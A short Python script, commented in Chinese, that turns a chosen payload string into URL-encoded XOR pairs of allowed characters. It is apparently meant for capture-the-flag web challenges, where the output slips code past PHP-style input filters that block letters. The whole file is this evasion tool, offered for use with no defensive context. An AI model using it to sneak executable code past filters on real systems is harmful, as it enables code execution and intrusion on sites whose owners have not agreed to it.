from urllib import parse
# 字符集characters为不被过滤的字符的十进制ascii值
characters = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 65, 69, 76, 86, 91, 92, 93, 94, 95, 96, 97, 101, 108, 118, 124, 127]

def find(x):
    if(ord(x) in characters):
        return [999,x]
    for i in range(0,len(characters)):
        for l in range(i,len(characters)):
            if(characters[i]^characters[l] == ord(x)):
                return [characters[i],characters[l]]
    
    return [0,0]

if __name__ == "__main__":
    str = 'code'    # 要转换的payload
    su = []
    for i in str:
        p = find(i)
        if(p[0] == 999):
            su.append("'"+i+"'")
            continue
        if(p[0] != 0 and p[1] != 0):
            su.append("('"+parse.quote(chr(p[0]))+"'^'"+parse.quote(chr(p[1]))+"')")
        else:
            su.append("error")

    print('.'.join(su))

